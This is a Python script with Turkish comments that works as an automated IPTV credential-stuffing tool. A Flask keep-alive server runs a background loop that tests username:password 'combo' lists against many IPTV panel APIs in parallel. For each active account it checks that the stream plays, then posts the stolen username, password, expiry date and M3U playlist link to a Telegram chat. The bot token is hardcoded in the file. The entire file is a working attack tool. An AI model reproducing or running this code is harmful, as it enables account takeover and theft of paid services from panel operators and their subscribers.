# -*- coding: utf-8 -*-

import os
import time
import datetime
import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from concurrent.futures import ThreadPoolExecutor, as_completed

# SSL uyarılarını kapat
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

from flask import Flask
app = Flask('')

@app.route('/')
def home():
    return "IPTV Çok Fonksiyonlu Bot Aktif ve Hızlı Modda Çalışıyor!"

TOKEN = "9296501081:AAG8COydawvxX-TfAEArbG-SdEtliP6WODM"
CHAT_ID = "-1004350622098"

def telegrama_gonder(mesaj):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        data = {"chat_id": CHAT_ID, "text": mesaj, "parse_mode": "HTML"}
        res = requests.post(url, data=data, timeout=10)
        
        if res.status_code != 200:
            print(f"[!] Telegram mesajı iletilemedi! Kod: {res.status_code}")
        else:
            print("[+] Telegram bildirimi başarıyla gönderildi.")
    except Exception as e:
        print(f"[!] Telegram bağlantı hatası: {e}")

HEADERd = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'Accept': '*/*',
    'Connection': 'Keep-Alive',
}

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# Optimize edilmiş session Havuzu
session = requests.Session()
adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50, max_retries=1)
session.mount('http://', adapter)
session.mount('https://', adapter)

def canli_yayin_test_et(panel, user, pas, stream_id):
    """Çok fonksiyonlu tarayıcının en önemli özelliği: Yayının gerçekten çalışıp çalışmadığını test eder."""
    stream_url = f"http://{panel}/live/{user}/{pas}/{stream_id}.m3u8"
    try:
        res = session.get(stream_url, headers=HEADERd, timeout=4, verify=False, allow_redirects=True)
        if res.status_code == 200:
            content_type = res.headers.get('Content-Type', '')
            if 'video' in content_type or 'mpegurl' in content_type or len(res.content) > 50:
                return True
    except:
        pass
    return False

def m3u_tara_detayli(panel, user, pas):
    """Gelişmiş Çok Fonksiyonlu Tarayıcı Motoru"""
    api_url = f"http://{panel}/player_api.php?username={user}&password={pas}"
    try:
        res = session.get(api_url, headers=HEADERd, timeout=(3, 5), verify=False)
        if res.status_code == 200 and 'user_info' in res.text:
            data = res.json()
            user_info = data.get('user_info', {})
            status = user_info.get('status', '')
            
            if status.lower() != 'active':
                return False

            print(f"[+] AKTİF HESAP BULUNDU, DETAYLAR Taranıyor... Panel: {panel} | User: {user}")
            
            acon = user_info.get('active_cons', '?')
            mcon = user_info.get('max_connections', '?')
            exp_timestamp = user_info.get('exp_date')
            
            if not exp_timestamp or exp_timestamp == 'null':
                bitis = 'Sınırsız'
            else:
                try:
                    bitis = datetime.datetime.fromtimestamp(int(exp_timestamp)).strftime('%Y-%m-%d %H:%M:%S')
                except:
                    bitis = 'Bilinmiyor'

            realm_info = data.get('server_info', {})
            realm = realm_info.get('url', panel)
            port = realm_info.get('port', '80')

            # Canlı, VOD ve Dizi İstatistikleri
            kanalsayisi, filmsayisi, dizisayisi = "0", "0", "0"
            first_stream_id = None
            
            try:
                # Canlı Yayınlar
                k_res = session.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_live_streams", timeout=3, verify=False)
                if k_res.status_code == 200:
                    live_list = k_res.json()
                    kanalsayisi = str(len(live_list))
                    if isinstance(live_list, list) and len(live_list) > 0:
                        first_stream_id = live_list[0].get('stream_id')

                # VOD (Filmler)
                v_res = session.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_vod_streams", timeout=3, verify=False)
                if v_res.status_code == 200:
                    filmsayisi = str(len(v_res.json()))

                # Diziler
                s_res = session.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_series", timeout=3, verify=False)
                if s_res.status_code == 200:
                    dizisayisi = str(len(s_res.json()))
            except:
                pass

            # Çok fonksiyonlu yayın test aşaması
            yayin_durumu = "⚠️ Doğrulanamadı"
            if first_stream_id:
                if canli_yayin_test_et(panel, user, pas, first_stream_id):
                    yayin_durumu = "🟢 Çalışıyor (Doğrulandı)"
                else:
                    yayin_durumu = "🔴 Yayın Kesik / Çalışmıyor"

            m3ulink = f"http://{panel}/get.php?username={user}&password={pas}&type=m3u_plus"
            
            mesaj = (
                f"🔥 <b>ÇOK FONKSİYONLU TARAYICI - HİT!</b>\n"
                f"🌐 <b>Ana Host:</b> http://{panel}\n"
                f"🔗 <b>Real Host:</b> http://{realm}:{port}\n"
                f"👤 <b>Kullanıcı:</b> <code>{user}</code>\n"
                f"🔑 <b>Şifre:</b> <code>{pas}</code>\n"
                f"📅 <b>Bitiş Tarihi:</b> {bitis}\n"
                f"⚡ <b>Aktif/Max Bağlantı:</b> {acon} / {mcon}\n"
                f"📡 <b>Yayın Testi:</b> {yayin_durumu}\n"
                f"📊 <b>Durum:</b> {status}\n"
                f"🎬 <b>Kanal:</b> {kanalsayisi} | <b>Film:</b> {filmsayisi} | <b>Dizi:</b> {dizisayisi}\n"
                f"🔗 <b>M3U Plus Link:</b> {m3ulink}"
            )
            
            telegrama_gonder(mesaj)
            return True
    except:
        pass
    return False

def arka_plan_tarayici():
    print("[*] Çok Fonksiyonlu Otonom Tarayıcı Başlatıldı...")
    time.sleep(2)
    telegrama_gonder("🚀 <b>Çok Fonksiyonlu IPTV Tarayıcı Aktif!</b>\n⚡ Canlı Yayın Doğrulama Modu Devrede.")
    
    combo_dir = os.path.join(BASE_DIR, 'combo')
    panel_dir = os.path.join(BASE_DIR, 'panel_list')
    
    while True:
        try:
            paneller = []
            if os.path.exists(panel_dir):
                for p_dosya in os.listdir(panel_dir):
                    if p_dosya.endswith('.txt'):
                        p_yol = os.path.join(panel_dir, p_dosya)
                        with open(p_yol, 'r', encoding='utf-8', errors='ignore') as pf:
                            for line in pf:
                                p_clean = line.strip().replace('http://', '').rstrip('/')
                                if p_clean:
                                    paneller.append(p_clean)

            if not paneller:
                paneller = ["ornekpanel.com:8080"]

            if os.path.exists(combo_dir):
                for dosya_adi in os.listdir(combo_dir):
                    if dosya_adi.endswith('.txt'):
                        dosya_yolu = os.path.join(combo_dir, dosya_adi)
                        print(f"\n[i] Taranan combo dosyası: {dosya_adi}")
                        
                        combolar = []
                        with open(dosya_yolu, 'r', encoding='utf-8', errors='ignore') as f:
                            for line in f:
                                line = line.strip()
                                if ':' in line:
                                    parts = line.split(':', 1)
                                    user = parts[0].strip()
                                    pas = parts[1].strip()
                                    if user and pas:
                                        combolar.append((user, pas))

                        print(f"[i] Toplam {len(combolar)} hesap, {len(paneller)} panel ile taranıyor...")
                        
                        chunk_size = 1000
                        toplam_chunk = (len(combolar) + chunk_size - 1) // chunk_size
                        
                        for idx, i in enumerate(range(0, len(combolar), chunk_size), 1):
                            chunk = combolar[i:i + chunk_size]
                            print(f"[i] İşleniyor: Chunk {idx}/{toplam_chunk} ({len(chunk)} hesap)...")
                            
                            with ThreadPoolExecutor(max_workers=20) as executor:
                                futures = [
                                    executor.submit(m3u_tara_detayli, panel, user, pas)
                                    for user, pas in chunk
                                    for panel in paneller
                                ]
                                for future in as_completed(futures):
                                    pass
                            
                            time.sleep(0.5)
        
            print("\n[i] Tarama turu tamamlandı, 10 dakika sonra tekrar dönecek...")
            time.sleep(600)
        except Exception as e:
            print(f"[!] Tarama döngüsü hatası: {e}")
            time.sleep(30)

if __name__ == '__main__':
    import threading
    t = threading.Thread(target=arka_plan_tarayici)
    t.daemon = True
    t.start()
    
    print("[*] Flask Web Sunucusu Başlatılıyor...")
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))